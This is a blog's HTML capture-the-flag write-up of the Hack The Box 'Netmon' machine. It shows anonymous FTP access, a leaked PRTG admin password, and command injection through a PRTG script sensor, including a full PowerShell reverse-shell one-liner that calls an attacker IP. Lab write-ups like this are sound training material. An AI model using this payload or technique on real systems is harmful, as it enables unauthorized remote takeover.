@@ -1,0 +1,401 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <title>nullarmor | Netmon - Hack The Box</title>
+  <meta name="description" content="Resolution of the Netmon machine">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <meta property="og:title" content="Netmon - Hack The Box">
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="https://nullarmor.github.io/posts/netmon">
+  <meta property="og:description" content="Resolution of the Netmon machine">
+  <meta property="og:site_name" content="nullarmor">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:url" content="https://nullarmor.github.io/posts/netmon">
+  <meta name="twitter:title" content="Netmon - Hack The Box">
+  <meta name="twitter:description" content="Resolution of the Netmon machine">
+  <meta name="google-site-verification" content="1sfOj2zDu7c444806MBQqbqFzNWxik880zgryQLMj-o" />
+
+  
+    
+      <meta property="og:image" content="https://nullarmor.github.io/assets/hackthebox/netmon/netmon-00-609f732ac179c04dd798e967bc45a602b4d6143ab7bacbae6712b36a136fae5b.png">
+      <meta name="twitter:image" content="https://nullarmor.github.io/assets/hackthebox/netmon/netmon-00-609f732ac179c04dd798e967bc45a602b4d6143ab7bacbae6712b36a136fae5b.png">
+    
+  
+
+  <link href="https://nullarmor.github.io/feed.xml" type="application/rss+xml" rel="alternate" title="nullarmor Last 10 blog posts" />
+
+  
+
+  
+
+    
+      <link rel="icon" type="image/x-icon" href="/assets/favicon-5df081ea197cddd592e345971da85e359e2f613dae2506c368835a695a297f82.gif">
+      <link rel="apple-touch-icon" href="/assets/favicon-5df081ea197cddd592e345971da85e359e2f613dae2506c368835a695a297f82.gif">
+      <link rel="stylesheet" type="text/css" title="light" id="light" href="/assets/light-fd3e34295723b96a04f635903b3650e5bb101ebdcc4d959165c3b4d2d88abe5e.css">
+      <link rel="stylesheet" type="text/css" title="dark" id="dark" href="/assets/dark-0f2545b8bdef934d32dd563b17074c614e7f4f4d5c3e682d4089a07fed36aa84.css" disabled="false">
+    
+
+  
+
+</head>
+
+<body>
+  <main>
+    <div class="grid grid-centered">
+      <div class="grid-cell">
+        <nav class="header-nav scrollappear">
+  <a href="/" class="header-logo" title="nullarmor">nullarmor</a>
+  <ul class="header-links">
+    
+      <li>
+        <a href="/about" title="About me">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-about">
+  <use href="/assets/about-ecf154b571ab8034ae00aeed91a3b7ad68db80b46d958753ad6216c919486e88.svg#icon-about" xlink:href="/assets/about-ecf154b571ab8034ae00aeed91a3b7ad68db80b46d958753ad6216c919486e88.svg#icon-about"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+      <li>
+        <a href="https://twitter.com/nullarmor" rel="noreferrer noopener" target="_blank" title="Twitter">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-twitter">
+  <use href="/assets/twitter-8842c33965263ad1b03a978406826677a668f94125d5837e70ab83f24b3213a7.svg#icon-twitter" xlink:href="/assets/twitter-8842c33965263ad1b03a978406826677a668f94125d5837e70ab83f24b3213a7.svg#icon-twitter"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+      <li>
+        <a href="https://github.com/nullarmor" rel="noreferrer noopener" target="_blank" title="GitHub">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-github">
+  <use href="/assets/github-094f81040819f34343ee6ffff0980f17e2807b08b595eaaf66ae3554934fd78d.svg#icon-github" xlink:href="/assets/github-094f81040819f34343ee6ffff0980f17e2807b08b595eaaf66ae3554934fd78d.svg#icon-github"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+    
+    
+    
+      <li>
+        <a href="https://www.linkedin.com/in/renan-almeida-8137a81a6" rel="noreferrer noopener" target="_blank" title="LinkedIn">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-linkedin">
+  <use href="/assets/linkedin-cdc5c107044324a3dfbea2e9ead15873f8dee304c37d73a046988956b706256e.svg#icon-linkedin" xlink:href="/assets/linkedin-cdc5c107044324a3dfbea2e9ead15873f8dee304c37d73a046988956b706256e.svg#icon-linkedin"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+      <li>
+        <a href="mailto:nullarmor@protonmail.com" title="Email">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-email">
+  <use href="/assets/email-782473193bf750036fdb90e8daa075508a20509d01854c09f3237c144a3f0601.svg#icon-email" xlink:href="/assets/email-782473193bf750036fdb90e8daa075508a20509d01854c09f3237c144a3f0601.svg#icon-email"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+      <li>
+        <a onclick="toggle()" title="Toggle Theme">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-theme">
+  <use href="/assets/theme-66869e0bf8dab34bae1c86bda400327b772e0be69e8dc28d3ede896e771320ed.svg#icon-theme" xlink:href="/assets/theme-66869e0bf8dab34bae1c86bda400327b772e0be69e8dc28d3ede896e771320ed.svg#icon-theme"></use>
+</svg>
+
+        </a>
+      </li>
+    
+  </ul>
+</nav>
+
+
+  <ul class="header-tags scrollappear">
+    
+    
+      
+        <li><a href="/tag/ctf">Ctf</a></li>
+    
+      
+        <li><a href="/tag/cybrics">Cybrics</a></li>
+    
+      
+        <li><a href="/tag/hackthebox">Hackthebox</a></li>
+    
+      
+        <li><a href="/tag/hacktivitycon">Hacktivitycon</a></li>
+    
+      
+        <li><a href="/tag/pwn">Pwn</a></li>
+    
+      
+        <li><a href="/tag/rev">Rev</a></li>
+    
+      
+        <li><a href="/tag/rgbctf">Rgbctf</a></li>
+    
+      
+        <li><a href="/tag/web">Web</a></li>
+    
+  </ul>
+
+
+        <article class="article scrollappear">
+          <header class="article-header">
+            <h1>Netmon - Hack The Box</h1>
+            <p>Resolution of the Netmon machine</p>
+            <div class="article-list-footer">
+  <span class="article-list-date">
+    May 19, 2020
+  </span>
+  <span class="article-list-divider">-</span>
+  <span class="article-list-minutes">
+    
+    
+      5 minute read
+    
+  </span>
+  <span class="article-list-divider">-</span>
+  <div class="article-list-tags">
+    
+      
+      <a href="/tag/hackthebox" title="See all posts with tag 'HackTheBox'">HackTheBox</a>
+    
+  </div>
+</div>
+          </header>
+
+          <div class="article-content">
+            <p><a href="/assets/hackthebox/netmon/netmon-00-609f732ac179c04dd798e967bc45a602b4d6143ab7bacbae6712b36a136fae5b.png">
+  <img src="/assets/hackthebox/netmon/netmon-00-609f732ac179c04dd798e967bc45a602b4d6143ab7bacbae6712b36a136fae5b.png" alt="Netmon banner" class="zooming" data-rjs="/assets/hackthebox/netmon/netmon-00-609f732ac179c04dd798e967bc45a602b4d6143ab7bacbae6712b36a136fae5b.png" data-zooming-width="596" data-zooming-height="378" />
+</a></p>
+
+<p>Netmon is an easy level machine based on Windows, has two open services where the first one is a <code class="highlighter-rouge">FTP server</code> that exposes the entire system and the last one is a vulnerable web application called <code class="highlighter-rouge">PRTG Network Monitor</code> that monitors the system network.</p>
+
+<h1 id="recon">Recon</h1>
+
+<p>Starting with Nmap:</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="c"># Nmap 7.70 scan initiated Fri Jan 17 11:02:18 2020 as: nmap -sV -sC -oA netmon -T4 -Pn 10.10.10.152</span>
+Nmap scan report <span class="k">for </span>10.10.10.152
+Host is up <span class="o">(</span>0.22s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 995 closed ports
+PORT    STATE SERVICE      VERSION
+21/tcp  open  ftp          Microsoft ftpd
+| ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
+| 02-02-19  11:18PM                 1024 .rnd
+| 02-25-19  09:15PM       &lt;DIR&gt;          inetpub
+| 07-16-16  08:18AM       &lt;DIR&gt;          PerfLogs
+| 02-25-19  09:56PM       &lt;DIR&gt;          Program Files
+| 02-02-19  11:28PM       &lt;DIR&gt;          Program Files <span class="o">(</span>x86<span class="o">)</span>
+| 02-03-19  07:08AM       &lt;DIR&gt;          Users
+|_02-25-19  10:49PM       &lt;DIR&gt;          Windows
+| ftp-syst: 
+|_  SYST: Windows_NT
+80/tcp  open  http         Indy httpd 18.1.37.13946 <span class="o">(</span>Paessler PRTG bandwidth monitor<span class="o">)</span>
+|_http-server-header: PRTG/18.1.37.13946
+| http-title: Welcome | PRTG Network Monitor <span class="o">(</span>NETMON<span class="o">)</span>
+|_Requested resource was /index.htm
+|_http-trane-info: Problem with XML parsing of /evox/about
+135/tcp open  msrpc        Microsoft Windows RPC
+139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 1m38s, deviation: 0s, median: 1m37s
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled <span class="o">(</span>dangerous, but default<span class="o">)</span>
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   <span class="nb">date</span>: 2020-01-17 11:04:21
+|_  start_date: 2020-01-17 10:51:53
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+<span class="c"># Nmap done at Fri Jan 17 11:02:49 2020 -- 1 IP address (1 host up) scanned in 31.34 seconds</span></code></pre></figure>
+
+<p>One thing that caught our attention is that the port 21 seems interesting because it allows an <code class="highlighter-rouge">anonymous login</code> that listen to the entire Windows system directory.</p>
+
+<p><a href="/assets/hackthebox/netmon/netmon-01-4e891214718be89d3f527e5f198d9856728cbbd8e10effe76ceeabe8bcd8f0db.png">
+  <img src="/assets/hackthebox/netmon/netmon-01-4e891214718be89d3f527e5f198d9856728cbbd8e10effe76ceeabe8bcd8f0db.png" alt="Netmon Recon" class="zooming" data-rjs="/assets/hackthebox/netmon/netmon-01-4e891214718be89d3f527e5f198d9856728cbbd8e10effe76ceeabe8bcd8f0db.png" data-zooming-width="518" data-zooming-height="305" />
+</a></p>
+
+<p>Now we can capture the user flag easily through the FTP:</p>
+
+<p><a href="/assets/hackthebox/netmon/netmon-02-17764ec0b8701ce54974e01d5393884200fd177e9d99364d46da633f3f4723bb.png">
+  <img src="/assets/hackthebox/netmon/netmon-02-17764ec0b8701ce54974e01d5393884200fd177e9d99364d46da633f3f4723bb.png" alt="Netmon Recon" class="zooming" data-rjs="/assets/hackthebox/netmon/netmon-02-17764ec0b8701ce54974e01d5393884200fd177e9d99364d46da633f3f4723bb.png" data-zooming-width="369" data-zooming-height="188" />
+</a></p>
+
+<p>The next step is to exploit the web application called <code class="highlighter-rouge">PRTG Network Monitor</code>. Googling about any exploit suitable for that application and we found an vulnerability where an attacker could retrieve PRTG credentials in plain text!</p>
+
+<p><a href="https://www.reddit.com/r/sysadmin/comments/835dai/prtg_exposes_domain_accounts_and_passwords_in/" target="_blank">PRTG exposes Domain accounts and passwords in plain text.</a></p>
+
+<blockquote>
+  <p>All copies generated by a PRTG Network Monitor version 17.4.35.3326 or later can be affected.</p>
+</blockquote>
+
+<blockquote>
+  <p>What’s next?</p>
+</blockquote>
+
+<blockquote>
+  <p>We recommend that you delete all affected copies of the PRTG Configuration.dat file
+Automatically generated backups under:
+C:\ProgramData\Paessler\PRTG Network Monitor\Configuration Auto-Backups\Automatically generated temporary files that may exist:</p>
+</blockquote>
+
+<blockquote>
+  <p>C:\ProgramData\Paessler\PRTG Network Monitor\PRTG Configuration.old.</p>
+</blockquote>
+
+<blockquote>
+  <p>C:\ProgramData\Paessler\PRTG Network Monitor\PRTG Configuration.nul.</p>
+</blockquote>
+
+<p>Knowing that we have access to the server’s FTP and we can look for that files.
+Looking for some time we found a file called <code class="highlighter-rouge">PRTG Configuration.old.bak</code> that is located at <code class="highlighter-rouge">/Users/All Users/Paessler/PRTG Network Monitor</code>.</p>
+
+<p>Searching inside the file we found an interesting string that appears to be a credential:</p>
+
+<p><a href="/assets/hackthebox/netmon/netmon-03-142f6dbe437dec445685a3ad2495a4d6d990e854c8263efa5576d9ec70f2655d.png">
+  <img src="/assets/hackthebox/netmon/netmon-03-142f6dbe437dec445685a3ad2495a4d6d990e854c8263efa5576d9ec70f2655d.png" alt="Netmon Recon" class="zooming" data-rjs="/assets/hackthebox/netmon/netmon-03-142f6dbe437dec445685a3ad2495a4d6d990e854c8263efa5576d9ec70f2655d.png" data-zooming-width="439" data-zooming-height="333" />
+</a></p>
+
+<h1 id="exploiting---exploiting-a-vulnerability-on-prtg-device-sensors">Exploiting - Exploiting a vulnerability on PRTG device sensors</h1>
+
+<p>Now that we have the web application credentials, let’s try it on the administrator panel:</p>
+
+<p><a href="/assets/hackthebox/netmon/netmon-04-671afdff869ef95eeab7d133adfd4eb4dc0c4effa236476ebeed70ab79070299.png">
+  <img src="/assets/hackthebox/netmon/netmon-04-671afdff869ef95eeab7d133adfd4eb4dc0c4effa236476ebeed70ab79070299.png" alt="Netmon Exploiting" class="zooming" data-rjs="/assets/hackthebox/netmon/netmon-04-671afdff869ef95eeab7d133adfd4eb4dc0c4effa236476ebeed70ab79070299.png" data-zooming-width="962" data-zooming-height="483" />
+</a></p>
+
+<p>But using these credentials we’re unable to login, changing the password <code class="highlighter-rouge">PrTg@dmin2018</code> to <code class="highlighter-rouge">PrTg@dmin2019</code> works!</p>
+
+<p><a href="/assets/hackthebox/netmon/netmon-05-69c39bc998ded51460cc2d8fccbdaa7cde3a3b040f1e7b0e8f88dbea606e3ec6.png">
+  <img src="/assets/hackthebox/netmon/netmon-05-69c39bc998ded51460cc2d8fccbdaa7cde3a3b040f1e7b0e8f88dbea606e3ec6.png" alt="Netmon Exploiting" class="zooming" data-rjs="/assets/hackthebox/netmon/netmon-05-69c39bc998ded51460cc2d8fccbdaa7cde3a3b040f1e7b0e8f88dbea606e3ec6.png" data-zooming-width="1281" data-zooming-height="481" />
+</a></p>
+
+<p>The PRTG Network Monitor monitors the system network with the help of <code class="highlighter-rouge">network devices</code> and <code class="highlighter-rouge">sensors</code>, they can be added as modules.
+There’s a specific sensor that deals with PowerShell stuff where it’s possible to inject system commands as a parameter.
+To exploit that vulnerability let’s click on <code class="highlighter-rouge">Devices</code>, then <code class="highlighter-rouge">GATEWAY</code> section and adding a sensor clicking on <code class="highlighter-rouge">Add Sensor</code> or accessing the URL <code class="highlighter-rouge">http://10.10.10.152/addsensor.htm?id=2004</code>.</p>
+
+<p>We select <code class="highlighter-rouge">Custom Sensors</code> and then we add the sensor <code class="highlighter-rouge">EXE/Script</code>:</p>
+
+<p><a href="/assets/hackthebox/netmon/netmon-06-11616cd2ad9eef6c0201844b3fa5acf6501554d9b92f595dc7cb25bc77054e9f.png">
+  <img src="/assets/hackthebox/netmon/netmon-06-11616cd2ad9eef6c0201844b3fa5acf6501554d9b92f595dc7cb25bc77054e9f.png" alt="Netmon Exploiting" class="zooming" data-rjs="/assets/hackthebox/netmon/netmon-06-11616cd2ad9eef6c0201844b3fa5acf6501554d9b92f595dc7cb25bc77054e9f.png" data-zooming-width="261" data-zooming-height="200" />
+</a></p>
+
+<p>On <code class="highlighter-rouge">EXE/Script</code> we select <code class="highlighter-rouge">Demo Powershell Script - Available MB via WMI.ps1</code> following by the bellow reverse shell payload:</p>
+
+<figure class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span class="p">;</span><span class="nv">$client</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nf">New-Object</span><span class="w"> </span><span class="nx">System.Net.Sockets.TCPClient</span><span class="p">(</span><span class="s1">'10.10.14.XX'</span><span class="p">,</span><span class="mi">4444</span><span class="p">);</span><span class="nv">$stream</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$client</span><span class="o">.</span><span class="nf">GetStream</span><span class="p">();[</span><span class="kt">byte</span><span class="p">[]]</span><span class="nv">$bytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="o">..</span><span class="mi">65535</span><span class="o">|%</span><span class="p">{</span><span class="mi">0</span><span class="p">};</span><span class="kr">while</span><span class="p">((</span><span class="nv">$i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$stream</span><span class="o">.</span><span class="nf">Read</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span><span class="w"> </span><span class="nx">0</span><span class="p">,</span><span class="w"> </span><span class="nv">$bytes</span><span class="o">.</span><span class="nf">Length</span><span class="p">))</span><span class="w"> </span><span class="o">-ne</span><span class="w"> </span><span class="mi">0</span><span class="p">){;</span><span class="nv">$data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="nf">New-Object</span><span class="w"> </span><span class="nt">-TypeName</span><span class="w"> </span><span class="nx">System.Text.ASCIIEncoding</span><span class="p">)</span><span class="o">.</span><span class="nf">GetString</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span><span class="nx">0</span><span class="p">,</span><span class="w"> </span><span class="nv">$i</span><span class="p">);</span><span class="nv">$sendback</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="nf">iex</span><span class="w"> </span><span class="nv">$data</span><span class="w"> </span><span class="nx">2</span><span class="err">&gt;</span><span class="o">&amp;</span><span class="nx">1</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">Out-String</span><span class="w"> </span><span class="p">);</span><span class="nv">$sendback2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$sendback</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'PS '</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="p">(</span><span class="nf">pwd</span><span class="p">)</span><span class="o">.</span><span class="nf">Path</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'&gt; '</span><span class="p">;</span><span class="nv">$sendbyte</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">([</span><span class="no">text.</span><span class="kt">encoding</span><span class="p">]::</span><span class="nf">ASCII</span><span class="p">)</span><span class="o">.</span><span class="nf">GetBytes</span><span class="p">(</span><span class="nv">$sendback2</span><span class="p">);</span><span class="nv">$stream</span><span class="o">.</span><span class="nf">Write</span><span class="p">(</span><span class="nv">$sendbyte</span><span class="p">,</span><span class="nx">0</span><span class="p">,</span><span class="nv">$sendbyte</span><span class="o">.</span><span class="nf">Length</span><span class="p">);</span><span class="nv">$stream</span><span class="o">.</span><span class="nf">Flush</span><span class="p">()};</span><span class="nv">$client</span><span class="o">.</span><span class="nf">Close</span><span class="p">()</span></code></pre></figure>
+
+<p><a href="/assets/hackthebox/netmon/netmon-07-fce1043b22480be8f629f48eff54659d35372bcae6adf4b10b99f544d1d364f7.png">
+  <img src="/assets/hackthebox/netmon/netmon-07-fce1043b22480be8f629f48eff54659d35372bcae6adf4b10b99f544d1d364f7.png" alt="Netmon Exploiting" class="zooming" data-rjs="/assets/hackthebox/netmon/netmon-07-fce1043b22480be8f629f48eff54659d35372bcae6adf4b10b99f544d1d364f7.png" data-zooming-width="852" data-zooming-height="337" />
+</a></p>
+
+<p>Let’s save the new sensor and set up the netcat on listening mode, after that we click on <code class="highlighter-rouge">Check Now</code> to activate our malicious sensor.</p>
+
+<p>After that we got our reverse shell:</p>
+
+<p><a href="/assets/hackthebox/netmon/netmon-08-b8efd71025c92f67befa299264e02c24e30b0bc5839d651e50c8eccb698dfa55.png">
+  <img src="/assets/hackthebox/netmon/netmon-08-b8efd71025c92f67befa299264e02c24e30b0bc5839d651e50c8eccb698dfa55.png" alt="Netmon Exploiting" class="zooming" data-rjs="/assets/hackthebox/netmon/netmon-08-b8efd71025c92f67befa299264e02c24e30b0bc5839d651e50c8eccb698dfa55.png" data-zooming-width="462" data-zooming-height="132" />
+</a></p>
+
+<h1 id="exploiting---using-a-custom-exploit">Exploiting - Using a custom exploit</h1>
+
+<p>For knowledge purposes I made a custom exploit that exploits the PRTG Network Monitor vulnerability and spawn an interactive reverse shell to us, it’s available on my GitHub :)</p>
+
+<p><a href="https://github.com/nullarmor/hackthebox-exploits/tree/master/netmon" target="_blank">Netmon Exploit</a></p>
+
+<p><a href="/assets/hackthebox/netmon/netmon-09-5ad41dbd23e4478b122f14f548e330803e2ac6bd57c9e5dd03d3c8684ad22ec9.png">
+  <img src="/assets/hackthebox/netmon/netmon-09-5ad41dbd23e4478b122f14f548e330803e2ac6bd57c9e5dd03d3c8684ad22ec9.png" alt="Netmon Exploit" class="zooming" data-rjs="/assets/hackthebox/netmon/netmon-09-5ad41dbd23e4478b122f14f548e330803e2ac6bd57c9e5dd03d3c8684ad22ec9.png" data-zooming-width="922" data-zooming-height="259" />
+</a></p>
+
+<p>For our surprise the PRTG Network Monitor run as system administrator, we can capture the root flag without any privilege escalation!</p>
+
+<p><a href="/assets/hackthebox/netmon/netmon-10-92a2473a17cf06022e551280ed2e9d93238d86259b8f74d8106a3243f41f46b2.png">
+  <img src="/assets/hackthebox/netmon/netmon-10-92a2473a17cf06022e551280ed2e9d93238d86259b8f74d8106a3243f41f46b2.png" alt="Netmon Exploiting" class="zooming" data-rjs="/assets/hackthebox/netmon/netmon-10-92a2473a17cf06022e551280ed2e9d93238d86259b8f74d8106a3243f41f46b2.png" data-zooming-width="412" data-zooming-height="174" />
+</a></p>
+
+          </div>
+          <div class="article-share">
+            
+            
+            <a href="https://twitter.com/home?status=Netmon+-+Hack+The+Box%20-%20https://nullarmor.github.io/posts/netmon%20by%20@nullarmor" title="Share on Twitter" rel="noreferrer noopener" target="_blank">
+              <svg viewBox="0 0 512 512"><path d="M492 109.5c-17.4 7.7-36 12.9-55.6 15.3 20-12 35.4-31 42.6-53.6 -18.7 11.1-39.4 19.2-61.5 23.5C399.8 75.8 374.6 64 346.8 64c-53.5 0-96.8 43.4-96.8 96.9 0 7.6 0.8 15 2.5 22.1 -80.5-4-151.9-42.6-199.6-101.3 -8.3 14.3-13.1 31-13.1 48.7 0 33.6 17.2 63.3 43.2 80.7C67 210.7 52 206.3 39 199c0 0.4 0 0.8 0 1.2 0 47 33.4 86.1 77.7 95 -8.1 2.2-16.7 3.4-25.5 3.4 -6.2 0-12.3-0.6-18.2-1.8 12.3 38.5 48.1 66.5 90.5 67.3 -33.1 26-74.9 41.5-120.3 41.5 -7.8 0-15.5-0.5-23.1-1.4C62.8 432 113.7 448 168.3 448 346.6 448 444 300.3 444 172.2c0-4.2-0.1-8.4-0.3-12.5C462.6 146 479 129 492 109.5z"/></svg>
+            </a>
+            <a href="https://www.facebook.com/sharer/sharer.php?u=https://nullarmor.github.io/posts/netmon" title="Share on Facebook" rel="noreferrer noopener" target="_blank">
+              <svg viewBox="0 0 512 512"><path d="M288 192v-38.1c0-17.2 3.8-25.9 30.5-25.9H352V64h-55.9c-68.5 0-91.1 31.4-91.1 85.3V192h-45v64h45v192h83V256h56.4l7.6-64H288z"/></svg>
+            </a>
+          </div>
+
+          
+            <div id="disqus_thread" class="article-comments"></div>
+            <script src="https://nullarmor.disqus.com/embed.js" async defer></script>
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+          
+        </article>
+        <footer class="footer scrollappear">
+  <p>
+    This site uses Chalk theme made by Nielsen Ramon.
+  </p>
+</footer>
+
+      </div>
+    </div>
+  </main>
+  
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-159304176-1"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'UA-159304176-1');
+  </script>
+
+
+<script type="text/javascript" src="/assets/vendor-2c224c53eb697c739f9490c38819a72184f09472739fd9e492272ef174090428.js"></script>
+
+
+  <script type="text/javascript" src="/assets/webfonts-96493456d319d1bf419afdf8701552d4d486fee6afd304897d4fd81eb4e0cc0b.js"></script>
+
+
+
+  <script type="text/javascript" src="/assets/scrollappear-e2da8ea567e418637e31266cc5302126eaa79f62a2273739086358b589a89ee6.js"></script>
+
+
+<script type="text/javascript" src="/assets/application-cfde13ac81ddaf4351b2e739603e2baf688d0fcc9aba613fe62bbb1c7b037fb9.js"></script>
+
+
+  <script type="text/javascript" src="/assets/themetoggle-df0d3d73164dc26dffbd630182ae4d0dfa7bee6b694a2b5d565d73595b582bbf.js"></script>
+
+</body>
+</html>
